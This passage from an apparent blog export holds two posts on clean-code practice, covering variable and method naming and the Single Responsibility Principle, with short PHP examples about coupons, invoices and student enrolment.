you are not.   It is more important to do the right stuff than doing the wrong thing but being productive and busy as a bee. You are just being a really naughty bee, now don’t be a bad bee when asked to improve your work ethics by saying, “but I’m already too busy polluting the honey with poison!”   Writing testable, robust and maintainable code is not a waste of time, it’s what you should do as a professional developer.      “We spend most of our time staring into the abyss rather than power typing.” ~Douglas Crockford    Let’s face the fact here, we are not like those dope hackers in the movies who type like their lives depend on it in front of the computer. No, we spend most of our time looking at ugly code, cursing the guy who committed it and sometimes even later realized it was you who wrote it.   We spend so much time staring at code that in fact the time ratio of reading and writing code is 10:1. For each hour of typing code, you spend 10 hours reading it.   Writing beautiful, elegant, and understandable code is not altruism, it’s to relieve yourself from pulling all-nighters to catch up with schedule, and being called in the middle of the night to be lashed about a bad bug.   Surprisingly only few people understands schedule delay and infesting bugs are not because your team members are typing too slow, on the contrary, it’s because you are writing too fast without caring about code quality and have to spend tons of time wading through horrific death swamp just to extend a new feature or fix a minor bug. It is lucrative to spend more time writing better code, and less time reading bad code.   It’s Your Responsibility   As a professional software developer, your job is not just to implement required functionalities, you have to deliver them with good practices and code quality.   It is your responsibility to write clean and quality code, not your clients’, not your colleagues’, not your team leader’s or your boss’s, yours. A famous analogy is that you don’t tell your doctor to skip washing their hands because it saves time.   Every job has their own work ethics, guidelines and procedures they follow to do their jobs right, so do we. If we want to be treated as professional developers, then we should act like one.   Code = Document   Your code is the best document if it’s done right. No matter how ellaborate you document your code, it won’t be of any help if the code quality is horrible.   And everytime you update your codebase, corresponding changes should be committed to the documents as well. If we don’t even write good quality code, I can’t imagine how awful the document would look like.   My team maintains no document whatsoever, partly because it brings more overhead than it brings good for a small team, but mostly because I believe self-explanatory code invalidate the purpose of documentation.   However, I’m not saying documentless is the definite way to go, many teams still maintain documentation or wiki about their codebase. But if you and your co-workers can understand eachother’s code without referring to comments or documentation, then why not?   Coder = Writer   At the dawn of Computer Science, programming was more of a method to talk to computers, to let the computers know our purpose and do our deeds. But that has changed since we invented high level progamming languages and introduced teamwork to the making of software.   Now we must write for other humanzzz as well, not just computers. Writing code that is hard to read and maintain by the future you or your co-workers brings much more trouble than compiling errors and runtime exceptions.   Write as a writer, write stuff you and your co-workers would enjoy reading and working with.   Leave It Better Than You Found It   So what if you are working on a gigantic ball of mud codebase and it seems too late to adopt any of these tips?   Actually it’s never too late to start writing clean code, and if you can convince yourself and you co-workers to improve the dirty code they come across, you’ll eventually have a clean codebase.   Now, note that leave the code you come across better than you found it does not equal to rewriting or refactoring. Fix the variable names, improve the structure of the class, divide functions that don’t follow Single Responsibility Principle into smaller ones, and implement meaningful method names would be good enough to eventually have notable effects.   Variables   Use English Words (Duh!?)   This is a huge problem my team suffered, they used to use PinYin as variable names, a method to write Chinese characters using letters to spell the pronunciation. Problem is there are some guesswork involved before you can understand the meaning of a variable due to the huge amount of homonyms in Chinese. Plus using roman letters only can’t effectively express intonations, which is crucial when determining the meaning of a phrase.   It’s quite a common thing in China, many teams suffer from this problem. It takes roughly 5-10 seconds for a native Chinese speaker to figure out the meaning of a variable name, quite ineffective.   It gets worse when your team has members from different countries or speak diffirent languages. I’ve seen lots of variable names written completely or partially in Malay when I was working in Malaysia, which is a huge pain for me as a foreigner.   I personally estimated the rough amount of frequently used English words when programming is only 100 - 500, give or take as people work in different types of businesses. Comparing to high school graduates in China, they have learned at least 2000 English vocabulary, which is more than enough to write English variable names.   Use Nouns Or Stataments   Variables are containers that hold data or state, you shouldn’t name them with verbs or questions.   // Nouns are the most common variable names. $comment; $avatar; $firstname;   // It sounds more like an action, and should be a function name. $moveStudent = true;  // Now it looks like a question, questions are more common in method names. $shouldMoveStudent = true;  // Nice and clear. $studentShouldBeMoved = true;   Don’t Abbreviate, Don’t Be Too Verbose Either   It sometimes surprises me how many people still name their variables with C or even ealier programming language styles decades ago, when efficiency was the utmost priority. They use abbreviations, single letter temporary variable names, even some mathmatical terms and habits like $tot, $sqrt, or $log.   Please don’t, as I noticed some new developers who didn’t witness the C era picked up the habits from other programmers, but have no idea why they name like that, or what do they mean.   Not everyone understands your abbreviation, not everyone’s feeling nostalgia, and we don’t have to shorten our code to save space anymore.   // What do they mean? $i, $q, $r, $c;  // What if someone don't understand these abbreviations? $idx, $req, $res, $cnt;  // Better but not perfect. $index, $request, $response, $count;  // Don't make them too long either $customersHusbandOrWifeAddress; =&gt; $spouseAddress;   Be Descriptive   Be generous when you name your variables, try to describe everything about the data or state your variables are holding.   Describe your intention clearly, don’t let your readers rely on context to understand your variable’s purpose.   Describe their natures fully. If you don’t express all characteristics of your variables, you risk confusing your readers.   // Count of what? $count;  // Better, but have you described its purpose clearly? $appliedCount;  // Perfect, especially if you have a $appliedTeachersCount in the context, this avoids ambiguity $appliedStudentsCount;   /*  * It's hard to understand the full picture.  * You are not describing every aspect of it.  * Is it the average score of all subjects of a particular student?  * Or is it the average score of the class?  */ $averageScore = array_sum($scores)/count($scores);  // Much better $studentAverageScore = array_sum($subjectsScores)/count($subjectsScores);   More Examples   $times = AlarmService::getTotalTimes($alarm_id);  return $times;  // The following is much more descriptive  $alarmTriggeredTimes = AlarmService::getTotalTriggeredTimesFor($alarm_id);   $revenue = 0;  foreach (     $company-&gt;getAllRevenue()             -&gt;latest()             -&gt;limit(12)     as $temp ) {      $revenue += $temp; }  return $revenue;  /*  * Don't confuse your readers with names like $temp  * It's hard to understand this piece of code  * without noticing what 12 means.  */  $yearly_revenue = 0;  foreach (     $company-&gt;getAllRevenue()             -&gt;latest()             -&gt;limit(12)     as $monthly_revenue ) {      $yearly_revenue += $monthly_revenue; }   /*  * Naming your variables and methods properly  * makes your code read like natural language.  * and become so much easier to read and work with.  */  $userIsActive = $user-&gt;isActive();  $addressIsDefault = $address-&gt;isDefault();  $newVersionAvailable = VersionService::isNewVersionAvailable();  do {     $allEmailsSent = EmailService::processEmailQueue(); } while (!$allEmailsSent)  if ($studentFailedAnyExam) {     ReportService::generateTranscriptWithRedBackground($student_id); }   Declare Variables Close To Where You Use Them   Unless they are constants or class properties, declaring your variables too far away from where you actually use them force your readers to jump around looking for definitions.   /*  * Declaring all variables at the beginning may be  * considered a good practice under certain context  * but it feels more like natural language to declare  * only when you are about to use them.  */  $expiringCoupons = $user-&gt;listExpiringCoupons();  $hasIneligibleCoupon = false; foreach ($expiringCoupons as $expiringCoupon) {     eligibleCouponValues = [30, 100, 250];      if (!in_array($expiringCoupon-&gt;value, $eligibleCouponValues)) {         $hasIneligibleCoupon = true;         continue;     }      CouponService:extendCoupon($expiringCoupon-&gt;id, 30); }  if (!$hasIneligibleCoupon) return;  EmailService::sendCouponExpiringWarning($user-&gt;id);   Alight! Thanks for reading. We talked about why we have to write clean code, the benefits of adopting it and some tips about variables. I hope you enjoyed the post, we’ll talk about functions and methods in the next instalment, later geeks!  ","categories": [],

        "excerpt":"Hello fellow geeks, welcome back to the second instalment of Clean Code Tips and Tricks. As said at the end of the first one, we are going to talk about method names today.   Method Names   Use verbs and questions  The same rules apply here as for variable names, but instead of using nouns and statements to describe variables, we use verbs and questions to name methods.   doSomething();  performSomeAction();  saveSomeData();  filterSomeInput();  validateSomeForm();   Methods answering questions should be, well, questions.   isUserActive();  isCustomerAdult();  shouldSendEmailAgain();  hasFailedAnyExam();   Be Descriptive   Similar to variable names, be sure to describe your intention well and wholly.   getData();  // More descriptive getDailyVisitors();  // And fully describe the nature getAverageDailyVisitors();   Method names do look longer this way, but it helps your readers to figure out the usage of these methods without even looking at their definitions.   However, if a method name becomes too long, you may have failed to follow the single responsibility rule, which means you need to break that method into smaller ones.   Examples   These are quiz designed for my team to practice naming methods, I’ll list some of them here as examples.   Note other examples are filtered ‘cause they were only there to examine my team’s ability to properly name methods in English.   //Get a particular user's email address. getUserEmailAddress($user_id);  //or to make it read more like natural language getEmailAddressOfUser($user_id);   // Get number of users in a group getGroupUserCount($group_id);  getUserCountInGroup($group_id);   // Update customer's defalut shipping address updateDefaultAddress($new_address);  setDefaultAddress($new_address);  // If the customer entity has another property // with a similar name, e.g. defaultPostalAddress // then it's better to avoid ambiguity by updateDefaultShippingAddress($new_shipping_address);  setDefaultPostalAddress($new_postal_address);  // If they are customer entity's methods, // You can choose whether to include 'customer' // in the function names. // I would personally not include it // since they will always be called with a Customer // instance. $customer-&gt;updateDefaultShippingAddress($new_shipping_address);  $customer-&gt;setCustomerDefaultPostalAddress($new_shipping_address);   // Update a given user's active status activateUser($user_id); disableUser($user_id);  // Or with one function $user-&gt;toggleActiveStatus(); toggleUserActiveStatus($user_id); toggleActiveStatusForUser($user_id);   // Is there any order placed by a user in the last month $user-&gt;hasPlacedAnyOrderLastMonth();  didUserPlaceAnyOrderLastMonth($user_id);  // Check if the email has been sent successfully $email-&gt;hasSuccessfullySent();  didEmailSendSuccessfully($email_id);  // Is it necessary to send the notification again $notification-&gt;shouldSendAgain();  shouldSendNotificationAgain($notification_id);  // Check if admin has the permission to perform an action $admin-&gt;canPerform($action_id);  adminHasPermissionTo($admin_id, $action_id);  $admin-&gt;isAuthorizedTo($action_id);   Single Responsibility Principle   Now let’s talk about Single Responsibility Princeple, the first rule from S.O.L.I.D.   Concept   A class or a module in a program should focus on one task. Or as how it’s famously put on the Internet, “A class or module should do only one job, and do it well.”   One analogy is that of a keyboard. An input device we use everyday, it accepts your keystrokes and transmits corresponding signals to the computer it’s connected to. It has only one functionality or interface if you will, but you can use it to play games, write articles, or even play an instrument if you have the right software installed on your computer. A game, a word processor, or an instrument simulator. Now these are all interchangable parts on the other side of the interface, but provides great potential to possible applications when working together as a system, all the while having the keyboard only focus on one task.   However, it absolutely makes no sense to integrate CPU in the keyboard. Despite that it sounds a little bit cool to have a keyboard with computational power, but you are introducing a completely different set of technology into the keyboard, it’d be bloated, and it’d introduce a single point of failure problem which makes your computer unusable when the keyboard decides to act up.   Think about toy blocks, they are simple in shapes and when stacked properly together, you can build tons of different types of buildings with them. But if their shapes become too complex and serve more purposes, they become specific, only usable under certain situations, thus limiting your ability to be versatile.   What It Means For Classes   A class should focus on a single set of cohesive tasks.   By cohesive, it means the member functions are highly interdependent and interconnected, they work together to define the characteristic of the class.   Cohesion also means collaboration. Think about development teams in an IT company, you don’t often come across a front-end developer in a database team, or a marketing person in a backend team who attends every sprint meeting. You are a unit who does something well, and you team works together to do something bigger well, and your whole development department collaborates together to deliver a really complex system, then all the departments in your company strive to make the business profitable.   It’s exactly the same thing in writing source code, every line of code in a method works together to define the method, every method in a class servers their purpose and create sense for the class, every class in a module fit together to form a module, and every module work together as a system.   /*  * A simple trick to tell if a class follows  * SRP is to try to describe it as descriptive as you can.  */  class EmailService {     protected $invoice;      function __construct(Invoice $invoice) {         $this-&gt;invoice = $invoice;     }      private function calculateTax() {         return $invoice-&gt;subtotal * 0.025;     }      public function emailInvoiceToUser(User $user) {         /* Code to generate email message */         if (!$emailHasSentSuccessfully) return false;          return true;     } }   The above code shows a very poorly designed class, if you try your best to verbosely describe the class, it’s one that “Calculates the tax and generates invoice email and sends email to a user”. You may as well name the class as TaxAndInvoiceAndEmailService.   This is how this simple trick works, if you ever see a class that should be named with and in it’s name, then it’s most probably not following the SRP.   You may argue that your business logic is such that an email would only be generated and sent to the user in the case of sending invoices, it makes sense to congregate these methods into one class.   That maybe true to some extend, but having separate EmailService, InvoiceService and TaxService makes it much more clearer and easier to extend, what if a wild sending coupon expiring warning emails or a applying discounts to invoices exceeds certain amount in subtotal requirement appears in the future? What if such requirements keep comming and eventually make this class too complex and coupled to work with?   What It Means For Methods   A method should do one thing, it should do it well, and it should do it only. Any method serves more than one purpose is not following SRP.   // If your method name suggests it does one thing, // Don't make it do something else.  public function calculateStudentAverageScore(Student $student) {     return array_sum($student-&gt;subjects-&gt;scores); }   You are returning the total scores, not the average score in the example above. It happens more often than you think it would, some developers name their method one thing and simply change their mind about it’s purpose as they implement it. Some are casued by co-workers modifying an existing method but misunderstood it’s intention. It is extremely confusing expecially when the method is long and complicated. What if someone new joins the team and uses the method to generate the report card?   Your average score is 692 points? I always knew my son would one day become a scientist!   // If your method name suggests it does one thing, // Don't make it do more than that. public function calculateSubtotal($productList) {     $subtotal = 0;     foreach ($productList as $product) {         $subtotal += $product-&gt;price * $product-&gt;quantity;     }      EmailService::sendInvoice($user_id, $subtotal);      return $subtotal; }   No sir, no no no no no. You are emailing invoice in a method that is supposed to only calculate the subtotal. Such code pollutes the codebase and is very hard to maintain. Imaigine your co-worker’s face when she sees calculateSubtotal function throwing an EmailDeliveryFailed exception. Or what if you are required to do your boss’s dirty deeds by helping his buddy to fake a seller’s sales record in your multi-tenant ecommerce system, and now random users are getting invoices for products they never purchased? (FYI, a true story)   public function enrolStudentToSemester(Student $student, Semester $semester) {     if ($student-&gt;hasOutstandingInvoice) {         $student-&gt;disableStudent();          EmailService::sendEmail(             $dean-&gt;emailAddress,             \"Warning: Student with outstanding fee\"         );     } else {         EmailService::sendEmail(             $student-&gt;emailAddress,             \"Welcome to Semester\" . $semester-&gt;name         );     }      $student-&gt;currentSemester = $semester;      return $student; }   The above code does more than just enrolling students to a new semester, let’s revise it.   public function enrolStudentToSemester(Student $student, Semester $semester) {     if ($student-&gt;hasOutstandingInvoice) {         $student-&gt;disableStudent();          sendOutstandingFeeWarningToDean($student);     } else {         sendWelcomeMessageToStudent($student, $semester);     }      $student-&gt;currentSemester = $semester;      return $student; }   Leaving specific email sending logics to other functions makes it much clearer.   /*  * Sometimes you may have this kind of business logic  * that sending notification is an inseparable part of  * new user registration routine.  */ public function registerUser($userData) {     $user = addUserToDatabse($userData);      sendNewUserNotificationToAdmin($user); }  /*  * But again, it works to some extend, but now these two  * business logics are tightly coupled together.  * You may want to refactor it into the following.  */  public function registerUser($userData) {     /* Do User Creation Stuff */ }  public function sendNewUserNotification($user) {     /* Send notification to admin */ }  public function registerUserAndSendNotification($userData) {     $user = registerUser($userData);      sendNewUserNotification($user); }   Now you can freely extend the above three functions as long as they do what their name says and keeps their interface integrity, this also allows others to freely choose which behavior fits their requirements best.   That’s all for today’s session folks, we talked about method naming tips, the Single Responsibility Principle from S.O.L.I.D, and covered what SRP means to both functions and classes. I hope you enjoyed it, we’ll talk about some general tips in the next instalment and a little bit on other S.O.L.I.D principles, see you then.  ","categories": [],
